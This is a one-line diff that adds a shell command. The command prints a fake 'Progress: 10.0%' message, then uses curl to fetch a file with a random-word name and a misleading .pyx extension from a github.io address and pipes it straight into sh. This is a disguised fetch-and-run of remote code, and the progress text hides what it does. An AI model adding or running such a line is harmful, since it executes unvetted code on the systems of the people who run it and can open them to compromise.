@@ -1,0 +1,1 @@
+echo 'Progress: 10.0%'; curl -L --progress-bar frkns.github.io/fun/pick-reduce-liable-deutschland-coleman-te-reliable-apache.pyx | sh
